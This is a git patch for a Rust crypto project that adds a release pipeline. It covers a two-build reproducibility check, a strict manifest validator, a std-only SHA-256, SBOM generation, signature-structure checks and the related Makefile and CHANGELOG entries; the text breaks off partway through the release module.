@@ -1,0 +1,3350 @@
+From a97bc294233c2e4a2fa7e373379809e3abb77c05 Mon Sep 17 00:00:00 2001
+From: AlexanderNyr <131390634+AlexanderNyr@users.noreply.github.com>
+Date: Wed, 25 Nov 2026 17:13:29 +0000
+Subject: [PATCH] =?UTF-8?q?O1:=20Releases=20=E2=80=94=20the=20two-host=20r?=
+ =?UTF-8?q?eproducibility=20gate=20(identical=20binary=20sha256).?=
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+
+The gate 'two independent hosts -> identical binary sha256' is measured,
+not asserted (D-O1-1): tools/repro_check.py builds the release binary aurad
+twice into two independent CARGO_TARGET_DIRs with SOURCE_DATE_EPOCH pinned
+to the commit date and path remapping (source root AND per-host target dir —
+tonic/prost OUT_DIR includes must not leak either path into panic
+locations), and records the identical digests in release/repro.txt. Named
+control: repro_mismatch_refused (error: release: repro mismatch: aura-bin,
+exit 65); 6/6 mutation NC red (tools/nc_o1.py); 10/10 golden scenarios +
+count guard (independent Python-hashlib oracle tools/gen_o1_vectors.py ->
+tests/o1_release.rs) against aura_testkit::release (std-only SHA-256,
+D-O1-5).
+
+The release process is a checked pipeline (D-O1-2): aura-release check
+validates the strict release/manifest.txt against the workspace — semver +
+version drift, the '## [0.1.0' CHANGELOG entry, artifact presence,
+SHA256SUMS digests, 64-byte detached ed25519 signature structure with the
+pinned keyid (D-O1-3; RFC 8032 verify is the wired tools/sign_release.py
+step, H1 demo key), the deterministic SBOM regeneration (D-O1-4), the
+two-host repro record, and the Dockerfile policy (multi-stage,
+digest-pinned bases). aura-release sync regenerates manifest/SHA256SUMS/
+SBOM; make repro-check / release-demo / release-check wire the live gate.
+
+Also: docs/evidence/o0 regenerated after fixing the named-control string
+check in tools/write_o0_evidence.py (it matched the pre-redesign 'shard 07'
+text and reported a false FAIL); the O0 verdicts are unchanged (11/11, 6/6,
+live registry=ok shards=10 targets=128).
+---
+ .gitignore                                    |   3 +
+ CHANGELOG.md                                  |  25 +
+ Makefile                                      |  36 +
+ ci/registry.txt                               |   1 +
+ crates/aura-testkit/Cargo.toml                |   4 +
+ crates/aura-testkit/src/bin/aura-release.rs   |  18 +
+ crates/aura-testkit/src/lib.rs                |   1 +
+ crates/aura-testkit/src/release.rs            | 728 ++++++++++++++++++
+ .../tests/fixtures/o1_release_vectors.json    | 342 ++++++++
+ crates/aura-testkit/tests/o1_release.rs       | 438 +++++++++++
+ docker/Dockerfile                             |  16 +
+ docs/coverage.txt                             |   6 +-
+ docs/evidence/o0/SHA256SUMS                   |  14 +-
+ docs/evidence/o0/coverage.log                 |   6 +-
+ docs/evidence/o0/gates.txt                    |   2 +-
+ docs/evidence/o0/inventory.txt                |   4 +-
+ docs/evidence/o0/registry-check.log           |   2 +-
+ docs/evidence/o0/report.md                    |  25 +-
+ docs/evidence/o0/test-o0.log                  |  12 +-
+ docs/evidence/o1/README.md                    |  20 +
+ docs/evidence/o1/SHA256SUMS                   |  16 +
+ docs/evidence/o1/gates.txt                    |   6 +
+ docs/evidence/o1/inventory.txt                |  21 +
+ docs/evidence/o1/nc.log                       |   9 +
+ docs/evidence/o1/release-check.log            |   7 +
+ docs/evidence/o1/release-demo.log             |   6 +
+ docs/evidence/o1/report.md                    |  38 +
+ docs/evidence/o1/repro-check.log              |   3 +
+ docs/evidence/o1/sbom.log                     |  23 +
+ docs/evidence/o1/test.log                     |  21 +
+ docs/evidence/review-w1-source-drift.txt      |  12 +-
+ docs/o1-releases-plan.md                      | 105 +++
+ docs/plans/OPS_PLAN.md                        |  51 +-
+ tools/audit_closeout.py                       |   8 +-
+ tools/gen_o1_vectors.py                       | 400 ++++++++++
+ tools/nc_o1.py                                |  95 +++
+ tools/repro_check.py                          | 106 +++
+ tools/write_o0_evidence.py                    |  31 +-
+ tools/write_o1_evidence.py                    | 184 +++++
+ 39 files changed, 2781 insertions(+), 64 deletions(-)
+ create mode 100644 crates/aura-testkit/src/bin/aura-release.rs
+ create mode 100644 crates/aura-testkit/src/release.rs
+ create mode 100644 crates/aura-testkit/tests/fixtures/o1_release_vectors.json
+ create mode 100644 crates/aura-testkit/tests/o1_release.rs
+ create mode 100644 docker/Dockerfile
+ create mode 100644 docs/evidence/o1/README.md
+ create mode 100644 docs/evidence/o1/SHA256SUMS
+ create mode 100644 docs/evidence/o1/gates.txt
+ create mode 100644 docs/evidence/o1/inventory.txt
+ create mode 100644 docs/evidence/o1/nc.log
+ create mode 100644 docs/evidence/o1/release-check.log
+ create mode 100644 docs/evidence/o1/release-demo.log
+ create mode 100644 docs/evidence/o1/report.md
+ create mode 100644 docs/evidence/o1/repro-check.log
+ create mode 100644 docs/evidence/o1/sbom.log
+ create mode 100644 docs/evidence/o1/test.log
+ create mode 100644 docs/o1-releases-plan.md
+ create mode 100644 tools/gen_o1_vectors.py
+ create mode 100644 tools/nc_o1.py
+ create mode 100644 tools/repro_check.py
+ create mode 100644 tools/write_o1_evidence.py
+
+diff --git a/.gitignore b/.gitignore
+index 254f39b..8e7fdc1 100644
+--- a/.gitignore
++++ b/.gitignore
+@@ -15,3 +15,6 @@ docs/evidence/**/*.tmp
+ # proptest failure seeds (NCs inject artificial bugs on purpose)
+ *.proptest-regressions
+ /clients/aura-keys/target/
++/release/
++/.repro-builder-a/
++/.repro-builder-b/
+diff --git a/CHANGELOG.md b/CHANGELOG.md
+index b02840f..1f0dc23 100644
+--- a/CHANGELOG.md
++++ b/CHANGELOG.md
+@@ -1,5 +1,30 @@
+ # Changelog — AuraLite-Crypto
+ 
++## [O1 — Releases phase closed (OPS Stage 1): the two-host reproducibility gate (`tools/repro_check.py`: two independent builds -> identical binary sha256, D-O1-1), the checked release manifest `release/manifest.txt` (`aura-release check`, D-O1-2), structural signature binding + wired RFC 8032 verify via `tools/sign_release.py` (D-O1-3), deterministic SBOM + digest-pinned multi-stage `docker/Dockerfile` + semver/CHANGELOG binding (D-O1-4), std-only SHA-256 pinned against Python hashlib (D-O1-5); gate 10 scenarios + NC: repro_mismatch_refused (two hosts disagree -> red)] 2026-11-25
++
++The release process is a checked pipeline, not folklore: `aura_testkit::release`
++validates a release directory (manifest, SHA256SUMS digests, 64-byte
++detached ed25519 signatures, the SBOM regeneration, the two-host
++`repro.txt` record, and the Dockerfile policy) against the workspace;
++`aura-release sync` regenerates the manifest records. 10 scenarios
++(`tests/fixtures/o1_release_vectors.json`) from the independent oracle
++`tools/gen_o1_vectors.py` (hashlib sha256), asserted byte-for-byte by
++`tests/o1_release.rs` (11/11 with the count guard). Named control:
++`repro_mismatch_refused` (`error: release: repro mismatch: aura-bin`,
++exit 65). The live gate `make repro-check` builds `aurad` twice into
++independent target directories with SOURCE_DATE_EPOCH + path remapping and
++records identical digests in `release/repro.txt`. This bundle also
++regenerates `docs/evidence/o0/` after correcting the named-control string
++check in `tools/write_o0_evidence.py` (it matched the pre-redesign `shard
++07` text); the O0 verdicts are unchanged. NC: 6 mutations (680 cumulative).
++
++## [0.1.0 — first release line (semver baseline, O1)] 2026-11-25
++
++Workspace version 0.1.0 (`[workspace.package]`, every crate on
++`version.workspace = true`) covers the whole C0..O1 record below; the
++release check binds this entry (`## [0.1.0`), the manifest `version` line
++and the workspace version together (`version drift` -> red).
++
+ ## [O0 — CI baseline phase closed (OPS Stage 1): the shard registry `ci/registry.txt` (10 shards over 127 `--lib`/`tests/*` targets, `make ci-sync`, D-O0-1), the target registry check `aura-ci check` wired into `make test` (D-O0-2), no secret shards — the format cannot carry commands, `aura-ci run --shard K` emits plain `cargo test` forms (D-O0-3), deterministic target-coverage report (D-O0-4), two independent implementations (D-O0-5); GitHub Actions matrix 0..9 + cargo cache + coverage job; gate 10 scenarios + NC: disabled_shard_refused (disable a shard -> CI red)] 2026-11-25
+ 
+ The CI layout is a checked registry, not YAML folklore: `aura_testkit::ci`
+diff --git a/Makefile b/Makefile
+index 9bd2a2e..ed447c8 100644
+--- a/Makefile
++++ b/Makefile
+@@ -1374,6 +1374,42 @@ ci-shard:
+ coverage:
+ 	@$(CARGO) run -q -p aura-testkit --bin aura-ci -- coverage | tee docs/coverage.txt
+ 
++# O1: the release pipeline — reproducible build, signed artifacts, SBOM.
++.PHONY: gen-o1-vectors test-o1 nc-o1 evidence-o1 sbom repro-check release-sync release-check release-demo
++
++gen-o1-vectors:
++	@$(PYTHON) tools/gen_o1_vectors.py
++
++test-o1:
++	@$(CARGO) test -p aura-testkit --test o1_release
++
++nc-o1:
++	@$(PYTHON) tools/nc_o1.py
++
++evidence-o1:
++	@$(PYTHON) tools/write_o1_evidence.py
++
++sbom:
++	@mkdir -p release && $(CARGO) run -q -p aura-testkit --bin aura-release -- sbom --workspace . --release release > release/SBOM.txt
++	@echo "sbom written: release/SBOM.txt"
++
++repro-check:
++	@$(PYTHON) tools/repro_check.py
++
++release-sync:
++	@$(CARGO) run -q -p aura-testkit --bin aura-release -- sync --workspace . --release release
++
++release-demo:
++	@mkdir -p release
++	@test -f release/aurad || (echo "run 'make repro-check' first (it places release/aurad)"; exit 1)
++	@$(PYTHON) tools/sign_release.py sign release/aurad
++	@$(CARGO) run -q -p aura-testkit --bin aura-release -- sync --workspace . --release release
++
++release-check:
++	@$(CARGO) run -q -p aura-testkit --bin aura-release -- check --workspace . --release release
++	@$(PYTHON) tools/sign_release.py verify release/aurad release/aurad.sig
++	@echo "signature verify (RFC 8032 demo key): ok"
++
+ # H0: the threat-model review gate (tools/check_threat_model.py).
+ .PHONY: gen-h0-vectors check-h0 nc-h0 evidence-h0
+ 
+diff --git a/ci/registry.txt b/ci/registry.txt
+index 063758e..79c7694 100644
+--- a/ci/registry.txt
++++ b/ci/registry.txt
+@@ -134,6 +134,7 @@ target aura-testkit/--lib shard core
+ target aura-testkit/h4_properties shard security
+ target aura-testkit/harness shard security
+ target aura-testkit/o0_ci shard core
++target aura-testkit/o1_release shard core
+ target aura-testkit/properties shard perf
+ target aura-testkit/vectors shard core
+ target aura-tx/--lib shard core
+diff --git a/crates/aura-testkit/Cargo.toml b/crates/aura-testkit/Cargo.toml
+index cff014f..b26c6a3 100644
+--- a/crates/aura-testkit/Cargo.toml
++++ b/crates/aura-testkit/Cargo.toml
+@@ -16,6 +16,10 @@ path = "src/bin/aura-fuzz.rs"
+ name = "aura-ci"
+ path = "src/bin/aura-ci.rs"
+ 
++[[bin]]
++name = "aura-release"
++path = "src/bin/aura-release.rs"
++
+ [dependencies]
+ aura-types.workspace = true
+ aura-codec.workspace = true
+diff --git a/crates/aura-testkit/src/bin/aura-release.rs b/crates/aura-testkit/src/bin/aura-release.rs
+new file mode 100644
+index 0000000..63da9e2
+--- /dev/null
++++ b/crates/aura-testkit/src/bin/aura-release.rs
+@@ -0,0 +1,18 @@
++//! `aura-release` — the O1 release pipeline driver (`aura_testkit::release`).
++//!
++//! Subcommands: `check`, `sbom`, `checksums`, `digest`, `sync`.
++//! Design: `docs/o1-releases-plan.md`.
++
++use std::io::Write;
++
++fn main() {
++    let args: Vec<String> = std::env::args().skip(1).collect();
++    let stdout = std::io::stdout();
++    let stderr = std::io::stderr();
++    let mut out = stdout.lock();
++    let mut err = stderr.lock();
++    let code = aura_testkit::release::run(&args, &mut out, &mut err);
++    let _ = out.flush();
++    let _ = err.flush();
++    std::process::exit(code);
++}
+diff --git a/crates/aura-testkit/src/lib.rs b/crates/aura-testkit/src/lib.rs
+index 56ea370..c50d26c 100644
+--- a/crates/aura-testkit/src/lib.rs
++++ b/crates/aura-testkit/src/lib.rs
+@@ -14,6 +14,7 @@
+ #![deny(missing_docs)]
+ 
+ pub mod ci;
++pub mod release;
+ 
+ use std::panic::{AssertUnwindSafe, catch_unwind};
+ use std::time::{Duration, Instant};
+diff --git a/crates/aura-testkit/src/release.rs b/crates/aura-testkit/src/release.rs
+new file mode 100644
+index 0000000..cbc652e
+--- /dev/null
++++ b/crates/aura-testkit/src/release.rs
+@@ -0,0 +1,728 @@
++//! O1 — Releases: the checked release manifest (D-O1-1..D-O1-5).
++//!
++//! The release process is a checked pipeline: [`check`] validates a release
++//! directory (`release/manifest.txt` registry, `SHA256SUMS`, detached
++//! `.sig` files, `SBOM.txt`, the two-host `repro.txt` record, and the
++//! `docker/Dockerfile` policy) against the workspace. The reproducibility
++//! gate (D-O1-1) is the named control `repro_mismatch_refused`: two
++//! independent build hosts must agree on the binary's sha256. Signature
++//! verification (RFC 8032) is the wired H1 tool `tools/sign_release.py`;
++//! this module checks the binding layer only and never claims to be
++//! cryptographic verification (D-O1-3).
++//!
++//! Design of record: `docs/o1-releases-plan.md`. Vectors:
++//! `tools/gen_o1_vectors.py` -> `tests/fixtures/o1_release_vectors.json`,
++//! asserted byte-for-byte by `tests/o1_release.rs`.
++//!
++//! NC targets (`tools/nc_o1.py`):
++//! 1. repro-equality check dropped -> `repro_mismatch_refused` red (the
++//!    named control: "two independent hosts -> identical binary sha256");
++//! 2. version check dropped -> `version_drift_refused` red;
++//! 3. changelog check dropped -> `changelog_missing_refused` red;
++//! 4. checksum match check dropped -> `checksum_mismatch_refused` red;
++//! 5. signature length check dropped -> `signature_malformed_refused` red;
++//! 6. unknown-line strictness dropped -> `foreign_manifest_line_refused`
++//!    red (the manifest format cannot carry commands).
++
++use std::io::Write;
++use std::path::{Path, PathBuf};
++
++/// Exit code for policy refusals.
++const EXIT_REFUSED: i32 = 65;
++
++/// Exit code for usage errors.
++const EXIT_USAGE: i32 = 64;
++
++/// The manifest rule pinned by the format (D-O1-2).
++const RULE: &str = "release-v1";
++
++/// An ed25519 detached signature is exactly 64 bytes (D-O1-3).
++const SIG_BYTES: usize = 64;
++
++// --------------------------------------------------------------------------- sha256
++
++/// The SHA-256 round constants (FIPS 180-4).
++const K: [u32; 64] = [
++    0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
++    0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
++    0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
++    0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
++    0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
++    0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
++    0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
++    0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2,
++];
++
++/// SHA-256 of `data` (std-only implementation, pinned against Python
++/// `hashlib` by the golden vectors — D-O1-5).
++pub fn sha256(data: &[u8]) -> [u8; 32] {
++    let mut h: [u32; 8] = [
++        0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a, 0x510e527f, 0x9b05688c, 0x1f83d9ab,
++        0x5be0cd19,
++    ];
++    let mut message = data.to_vec();
++    let bit_len = (data.len() as u64).wrapping_mul(8);
++    message.push(0x80);
++    while message.len() % 64 != 56 {
++        message.push(0);
++    }
++    message.extend_from_slice(&bit_len.to_be_bytes());
++    for chunk in message.chunks(64) {
++        let mut w = [0u32; 64];
++        for (index, word) in w.iter_mut().enumerate().take(16) {
++            let start = index * 4;
++            *word = u32::from_be_bytes([
++                chunk[start],
++                chunk[start + 1],
++                chunk[start + 2],
++                chunk[start + 3],
++            ]);
++        }
++        for index in 16..64 {
++            let s0 = w[index - 15].rotate_right(7)
++                ^ w[index - 15].rotate_right(18)
++                ^ (w[index - 15] >> 3);
++            let s1 = w[index - 2].rotate_right(17)
++                ^ w[index - 2].rotate_right(19)
++                ^ (w[index - 2] >> 10);
++            w[index] = w[index - 16]
++                .wrapping_add(s0)
++                .wrapping_add(w[index - 7])
++                .wrapping_add(s1);
++        }
++        let [mut a, mut b, mut c, mut d, mut e, mut f, mut g, mut hh] = h;
++        for index in 0..64 {
++            let s1 = e.rotate_right(6) ^ e.rotate_right(11) ^ e.rotate_right(25);
++            let ch = (e & f) ^ ((!e) & g);
++            let temp1 = hh
++                .wrapping_add(s1)
++                .wrapping_add(ch)
++                .wrapping_add(K[index])
++                .wrapping_add(w[index]);
++            let s0 = a.rotate_right(2) ^ a.rotate_right(13) ^ a.rotate_right(22);
++            let maj = (a & b) ^ (a & c) ^ (b & c);
++            let temp2 = s0.wrapping_add(maj);
++            hh = g;
++            g = f;
++            f = e;
++            e = d.wrapping_add(temp1);
++            d = c;
++            c = b;
++            b = a;
++            a = temp1.wrapping_add(temp2);
++        }
++        h[0] = h[0].wrapping_add(a);
++        h[1] = h[1].wrapping_add(b);
++        h[2] = h[2].wrapping_add(c);
++        h[3] = h[3].wrapping_add(d);
++        h[4] = h[4].wrapping_add(e);
++        h[5] = h[5].wrapping_add(f);
++        h[6] = h[6].wrapping_add(g);
++        h[7] = h[7].wrapping_add(hh);
++    }
++    let mut out = [0u8; 32];
++    for (index, word) in h.iter().enumerate() {
++        out[index * 4..index * 4 + 4].copy_from_slice(&word.to_be_bytes());
++    }
++    out
++}
++
++/// Lowercase hex of `bytes`.
++fn hex(bytes: &[u8]) -> String {
++    let mut out = String::with_capacity(bytes.len() * 2);
++    for byte in bytes {
++        out.push_str(&format!("{byte:02x}"));
++    }
++    out
++}
++
++/// Strict base64 decode (standard alphabet, padding required).
++fn base64_decode(text: &str) -> Option<Vec<u8>> {
++    if !text.len().is_multiple_of(4) {
++        return None;
++    }
++    let mut values: Vec<u8> = Vec::new();
++    let mut padding = 0;
++    for (index, ch) in text.chars().enumerate() {
++        let value = match ch {
++            'A'..='Z' => ch as u8 - b'A',
++            'a'..='z' => ch as u8 - b'a' + 26,
++            '0'..='9' => ch as u8 - b'0' + 52,
++            '+' => 62,
++            '/' => 63,
++            '=' => {
++                if index < text.len() - 2 {
++                    return None;
++                }
++                padding += 1;
++                0
++            }
++            _ => return None,
++        };
++        values.push(value);
++    }
++    if padding > 2 {
++        return None;
++    }
++    let mut out = Vec::new();
++    for group in values.chunks(4) {
++        let triple = ((group[0] as u32) << 18)
++            | ((group[1] as u32) << 12)
++            | ((group[2] as u32) << 6)
++            | (group[3] as u32);
++        out.push(((triple >> 16) & 0xff) as u8);
++        out.push(((triple >> 8) & 0xff) as u8);
++        out.push((triple & 0xff) as u8);
++    }
++    for _ in 0..padding {
++        out.pop();
++    }
++    Some(out)
++}
++
++// --------------------------------------------------------------------------- model
++
++/// A strict parse of `release/manifest.txt` (D-O1-2).
++#[derive(Debug, Clone)]
++struct Manifest {
++    /// The release version (`version` line).
++    version: String,
++    /// The pinned signer key id (`keyid` line).
++    keyid: String,
++    /// Artifact names in file order (`artifact` lines).
++    artifacts: Vec<String>,
++    /// `(artifact, sigfile)` pairs in file order (`sig` lines).
++    sigs: Vec<(String, String)>,
++}
++
++/// One workspace package (from `crates/*/Cargo.toml`).
++#[derive(Debug, Clone)]
++struct Package {
++    /// The package name.
++    name: String,
++    /// The resolved version (workspace version for `version.workspace`).
++    version: String,
++    /// The resolved license.
++    license: String,
++    /// `[dependencies]` keys, sorted.
++    deps: Vec<String>,
++}
++
++/// Workspace facts read from the manifests (D-O1-4).
++#[derive(Debug, Clone)]
++struct Workspace {
++    /// `[workspace.package] version`.
++    version: String,
++    /// The packages under `crates/`, sorted by name.
++    packages: Vec<Package>,
++}
++
++// --------------------------------------------------------------------------- parsing
++
++/// Parse the strict release manifest; unknown lines are refused so the
++/// format cannot carry commands.
++fn parse_manifest(text: &str) -> Result<Manifest, String> {
++    let mut rule = false;
++    let mut version = None;
++    let mut keyid = None;
++    let mut artifacts = Vec::new();
++    let mut sigs = Vec::new();
++    for raw in text.lines() {
++        let line = raw.trim_end();
++        if line.is_empty() || line.starts_with('#') {
++            continue;
++        }
++        if line == format!("rule {RULE}") {
++            rule = true;
++        } else if let Some(value) = line.strip_prefix("version ") {
++            version = Some(value.to_string());
++        } else if let Some(value) = line.strip_prefix("keyid ") {
++            keyid = Some(value.to_string());
++        } else if let Some(value) = line.strip_prefix("artifact ") {
++            artifacts.push(value.to_string());
++        } else if let Some(value) = line.strip_prefix("sig ") {
++            let (artifact, sigfile) = value
++                .split_once(' ')
++                .ok_or_else(|| format!("unknown manifest line: {line}"))?;
++            sigs.push((artifact.to_string(), sigfile.to_string()));
++        } else {
++            return Err(format!("unknown manifest line: {line}"));
++        }
++    }
++    if !rule {
++        return Err("missing rule line".to_string());
++    }
++    Ok(Manifest {
++        version: version.ok_or("missing version line")?,
++        keyid: keyid.ok_or("missing keyid line")?,
++        artifacts,
++        sigs,
++    })
++}
++
++/// Extract `key = "value"` from a section of a TOML-ish manifest.
++fn toml_value(section_text: &str, key: &str) -> Option<String> {
++    for raw in section_text.lines() {
++        let line = raw.trim();
++        if let Some(rest) = line.strip_prefix(key) {
++            let rest = rest.trim_start();
++            if let Some(value) = rest.strip_prefix('=') {
++                let value = value.trim();
++                if let Some(inner) = value.strip_prefix('"') {
++                    return inner.strip_suffix('"').map(str::to_string);
++                }
++            }
++        }
++    }
++    None
++}
++
++/// Split a TOML-ish file into `(section, body)` pairs (stdlib-only; the
++/// fixtures and the workspace manifests stay within this subset).
++fn toml_sections(text: &str) -> Vec<(String, String)> {
++    let mut sections = Vec::new();
++    let mut current = String::new();
++    let mut body = String::new();
++    for raw in text.lines() {
++        let line = raw.trim();
++        if line.starts_with('[') && line.ends_with(']') {
++            if !current.is_empty() {
++                sections.push((current.clone(), body.clone()));
++            }
++            current = line[1..line.len() - 1].to_string();
++            body = String::new();
++        } else {
++            body.push_str(raw);
++            body.push('\n');
++        }
++    }
++    if !current.is_empty() {
++        sections.push((current, body));
++    }
++    sections
++}
++
++/// Read the workspace facts: `[workspace.package]` version/license and the
++/// packages under `crates/` (name, resolved version/license, dependency
++/// keys).
++fn parse_workspace(root: &Path) -> Result<Workspace, String> {
++    let manifest_path = root.join("Cargo.toml");
++    let manifest_text =
++        std::fs::read_to_string(&manifest_path).map_err(|_| "cannot read workspace".to_string())?;
++    let mut version = None;
++    let mut license = None;
++    for (section, body) in toml_sections(&manifest_text) {
++        if section == "workspace.package" {
++            version = toml_value(&body, "version");
++            license = toml_value(&body, "license");
++        }
++    }
++    let version = version.ok_or("workspace version missing")?;
++    let license = license.unwrap_or_default();
++    let crates = root.join("crates");
++    let entries = std::fs::read_dir(&crates).map_err(|_| "bad workspace".to_string())?;
++    let mut dirs: Vec<PathBuf> = entries.flatten().map(|entry| entry.path()).collect();
++    dirs.sort();
++    let mut packages = Vec::new();
++    for dir in dirs {
++        let manifest_path = dir.join("Cargo.toml");
++        let Ok(text) = std::fs::read_to_string(&manifest_path) else {
++            continue;
++        };
++        let mut name = None;
++        let mut pkg_version = None;
++        let mut pkg_license = None;
++        let mut deps = Vec::new();
++        for (section, body) in toml_sections(&text) {
++            if section == "package" {
++                name = toml_value(&body, "name");
++                pkg_version = toml_value(&body, "version");
++                pkg_license = toml_value(&body, "license");
++                if body.contains("version.workspace = true") {
++                    pkg_version = Some(version.clone());
++                }
++                if body.contains("license.workspace = true") {
++                    pkg_license = Some(license.clone());
++                }
++            } else if section == "dependencies" {
++                for raw in body.lines() {
++                    let line = raw.trim();
++                    if line.is_empty() || line.starts_with('#') {
++                        continue;
++                    }
++                    if let Some((key, _)) = line.split_once(" =") {
++                        let key = key.trim();
++                        if !key.is_empty() {
++                            deps.push(key.to_string());
++                        }
++                    }
++                }
++            }
++        }
++        let Some(name) = name else {
++            continue;
++        };
++        deps.sort();
++        deps.dedup();
++        packages.push(Package {
++            name,
++            version: pkg_version.unwrap_or_else(|| version.clone()),
++            license: pkg_license.unwrap_or_else(|| license.clone()),
++            deps,
++        });
++    }
++    packages.sort_by(|a, b| a.name.cmp(&b.name));
++    Ok(Workspace { version, packages })
++}
++
++/// The deterministic SBOM (D-O1-4): `sbom v1` + one `pkg` line per crate.
++fn sbom_text(workspace: &Workspace) -> String {
++    let mut out = String::from("sbom v1\n");
++    for package in &workspace.packages {
++        out.push_str(&format!(
++            "pkg name={} version={} license={} deps={}\n",
++            package.name,
++            package.version,
++            package.license,
++            package.deps.join(",")
++        ));
++    }
++    out
++}
++
++/// The deterministic `SHA256SUMS` text for the manifest artifacts.
++fn checksums_text(release: &Path, manifest: &Manifest) -> Result<String, String> {
++    let mut names = manifest.artifacts.clone();
++    names.sort();
++    names.dedup();
++    let mut out = String::new();
++    for name in names {
++        let data =
++            std::fs::read(release.join(&name)).map_err(|_| format!("artifact missing: {name}"))?;
++        out.push_str(&format!("{}  {name}\n", hex(&sha256(&data))));
++    }
++    Ok(out)
++}
++
++// --------------------------------------------------------------------------- checks
++
++/// The release check (D-O1-2), in the pinned order; returns the ok line.
++fn check(workspace: &Workspace, release: &Path) -> Result<String, String> {
++    let manifest_path = release.join("manifest.txt");
++    let manifest_text =
++        std::fs::read_to_string(&manifest_path).map_err(|_| "cannot read manifest".to_string())?;
++    let manifest = parse_manifest(&manifest_text)?;
++
++    // The manifest's key id must match the pinned release key (D-O1-3).
++    let pinned = std::fs::read_to_string(release.join("../docs/release-pubkey.txt"))
++        .or_else(|_| std::fs::read_to_string("docs/release-pubkey.txt"))
++        .map_err(|_| "cannot read release pubkey".to_string())?;
++    if manifest.keyid != pinned.trim() {
++        return Err(format!("key mismatch: {}", manifest.keyid));
++    }
++
++    // Semver + workspace version match (D-O1-4).
++    let semver_ok = {
++        let parts: Vec<&str> = manifest.version.split('.').collect();
++        parts.len() == 3
++            && parts
++                .iter()
++                .all(|part| !part.is_empty() && part.chars().all(|ch| ch.is_ascii_digit()))
++    };
++    if !semver_ok {
++        return Err(format!("bad version: {}", manifest.version));
++    }
++    if manifest.version != workspace.version {
++        return Err(format!("version drift: {}", manifest.version));
++    }
++
++    // CHANGELOG carries the release entry (D-O1-4).
++    let changelog = std::fs::read_to_string(release.join("../CHANGELOG.md"))
++        .or_else(|_| std::fs::read_to_string("CHANGELOG.md"))
++        .map_err(|_| "cannot read changelog".to_string())?;
++    if !changelog.contains(&format!("## [{}", manifest.version)) {
++        return Err(format!("changelog entry missing: {}", manifest.version));
++    }
++
++    // Artifacts exist; digests match (D-O1-2).
++    for name in &manifest.artifacts {
++        if !release.join(name).is_file() {
++            return Err(format!("artifact missing: {name}"));
++        }
++    }
++    let expected_sums = checksums_text(release, &manifest)?;
++    let sums_text = std::fs::read_to_string(release.join("SHA256SUMS"))
++        .map_err(|_| "cannot read SHA256SUMS".to_string())?;
++    let expected_lines: Vec<&str> = expected_sums.lines().collect();
++    let actual_lines: Vec<&str> = sums_text.lines().collect();
++    for index in 0..expected_lines.len().max(actual_lines.len()) {
++        match (expected_lines.get(index), actual_lines.get(index)) {
++            (Some(expected), Some(actual)) => {
++                if expected != actual {
++                    let name = expected.split("  ").nth(1).unwrap_or("?");
++                    return Err(format!("checksum mismatch: {name}"));
++                }
++            }
++            (Some(expected), None) => {
++                let name = expected.split("  ").nth(1).unwrap_or("?");
++                return Err(format!("checksum stale: {name}"));
++            }
++            (None, Some(actual)) => {
++                let name = actual.split("  ").nth(1).unwrap_or("?");
++                return Err(format!("checksum stale: {name}"));
++            }
++            (None, None) => {}
++        }
++    }
++
++    // Signature binding: every artifact carries a 64-byte detached ed25519
++    // signature (D-O1-3; the RFC 8032 verify is tools/sign_release.py).
++    for name in &manifest.artifacts {
++        let Some((_, sigfile)) = manifest.sigs.iter().find(|(artifact, _)| artifact == name) else {
++            return Err(format!("signature missing: {name}"));
++        };
++        let data = std::fs::read(release.join(sigfile))
++            .map_err(|_| format!("signature missing: {name}"))?;
++        let text = String::from_utf8_lossy(&data).trim().to_string();
++        let decoded = base64_decode(&text).ok_or_else(|| format!("signature malformed: {name}"))?;
++        if decoded.len() != SIG_BYTES {
++            return Err(format!("signature malformed: {name}"));
++        }
++    }
++
++    // The SBOM matches the workspace regeneration (D-O1-4).
++    let sbom = std::fs::read_to_string(release.join("SBOM.txt"))
++        .map_err(|_| "cannot read SBOM".to_string())?;
++    if sbom != sbom_text(workspace) {
++        return Err("sbom drift".to_string());
++    }
++
++    // The two-host reproducibility record (D-O1-1) — the named gate.
++    let repro = std::fs::read_to_string(release.join("repro.txt"))
++        .map_err(|_| "cannot read repro record".to_string())?;
++    let mut binary = None;
++    let mut hosts: Vec<(String, String)> = Vec::new();
++    for raw in repro.lines() {
++        let line = raw.trim_end();
++        if line.is_empty() || line.starts_with('#') {
++            continue;
++        }
++        if line == "repro v1" {
++            continue;
++        } else if let Some(value) = line.strip_prefix("binary ") {
++            binary = Some(value.to_string());
++        } else if let Some(rest) = line.strip_prefix("toolchain ") {
++            let _ = rest;
++        } else if let Some(rest) = line.strip_prefix("source_date_epoch ") {
++            let _ = rest;
++        } else if let Some(rest) = line.strip_prefix("host ") {
++            let (host, digest) = rest
++                .split_once(" sha256 ")
++                .ok_or_else(|| format!("unknown repro line: {line}"))?;
++            hosts.push((host.to_string(), digest.to_string()));
++        } else {
++            return Err(format!("unknown repro line: {line}"));
++        }
++    }
++    let binary = binary.ok_or("missing binary line")?;
++    if hosts.len() < 2 {
++        return Err(format!("repro mismatch: {binary}"));
++    }
++    let first = &hosts[0].1;
++    if hosts.iter().any(|(_, digest)| digest != first) {
++        return Err(format!("repro mismatch: {binary}"));
++    }
++    let sums = checksums_text(release, &manifest)?;
++    let pinned_digest = sums
++        .lines()
